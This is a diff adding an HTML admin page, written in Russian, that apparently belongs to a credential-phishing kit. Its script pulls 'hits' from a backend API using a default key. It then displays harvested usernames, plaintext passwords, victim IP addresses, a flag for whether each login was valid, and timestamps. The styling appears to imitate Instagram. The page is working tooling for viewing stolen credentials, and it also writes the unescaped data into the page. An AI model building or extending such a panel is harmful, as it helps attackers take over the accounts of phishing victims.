@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background:#0a0a0a; color:#eee; padding:24px; }
+  h1 { font-size:20px; margin-bottom:16px; }
+  .bar { display:flex; gap:8px; margin-bottom:16px; }
+  input { padding:10px 12px; border-radius:8px; border:1px solid #333; background:#141414; color:#fff; flex:1; outline:none; }
+  input:focus { border-color:#555; }
+  button { padding:10px 16px; border-radius:8px; border:none; background:#0095f6; color:#fff; font-weight:600; cursor:pointer; }
+  button:active { opacity:0.8; }
+  table { width:100%; border-collapse:collapse; font-size:13px; margin-top:20px; }
+  th, td { text-align:left; padding:10px 8px; border-bottom:1px solid #222; vertical-align:top; word-break:break-all; }
+  th { color:#888; font-weight:500; }
+  .ok { color:#00c853; font-weight:bold; }
+  .bad { color:#ff6b6b; }
+  .error { color:#ff6b6b; margin-top:10px; font-size:14px; font-weight:bold; }
+  .info { color:#0095f6; margin-top:10px; }
+</style>
+</head>
+<body>
+<h1>Админ-панель — полученные данные</h1>
+<div class="bar">
+  <input id="key" type="password" placeholder="Admin key" value="change_me_123">
+  <button id="load">Загрузить</button>
+</div>
+<div id="msg" class="info"></div>
+<div id="out"></div>
+
+<script>
+document.getElementById('load').onclick = async function() {
+  var key = document.getElementById('key').value;
+  var msgDiv = document.getElementById('msg');
+  var outDiv = document.getElementById('out');
+  
+  msgDiv.className = 'info';
+  msgDiv.textContent = 'Загрузка...';
+  outDiv.innerHTML = '';
+
+  try {
+    var response = await fetch('/api/admin/hits', { 
+        headers: { 'X-Admin-Key': key } 
+    });
+    
+    if (response.status === 403) {
+        msgDiv.className = 'error';
+        msgDiv.textContent = 'Ошибка: Неверный ключ доступа';
+        return;
+    }
+    
+    if (!response.ok) {
+        msgDiv.className = 'error';
+        msgDiv.textContent = 'Ошибка сервера: код ' + response.status;
+        return;
+    }
+
+    var rows = await response.json();
+    
+    if (!Array.isArray(rows) || rows.length === 0) {
+        msgDiv.textContent = 'База данных пуста или данные не найдены.';
+        return;
+    }
+
+    msgDiv.textContent = 'Успешно загружено: ' + rows.length + ' записей.';
+
+    var html = '<table><tr><th>ID</th><th>Логин</th><th>Пароль</th><th>IP</th><th>Верный</th><th>Время</th></tr>';
+    
+    for (var i = 0; i < rows.length; i++) {
+      var x = rows[i];
+      var isValid = x.valid ? '<span class="ok">ДА</span>' : '<span class="bad">НЕТ</span>';
+      
+      html += '<tr>' +
+        '<td>' + x.id + '</td>' +
+        '<td>' + x.username + '</td>' +
+        '<td style="color:#ffeb3b; font-weight:bold;">' + x.password + '</td>' +
+        '<td>' + x.ip + '</td>' +
+        '<td>' + isValid + '</td>' +
+        '<td>' + x.time + '</td>' +
+      '</tr>';
+    }
+    html += '</table>';
+    outDiv.innerHTML = html;
+
+  } catch (err) {
+    msgDiv.className = 'error';
+    msgDiv.textContent = 'Ошибка при подключении: ' + err.message;
+  }
+};
+</script>
+</body>
+</html>
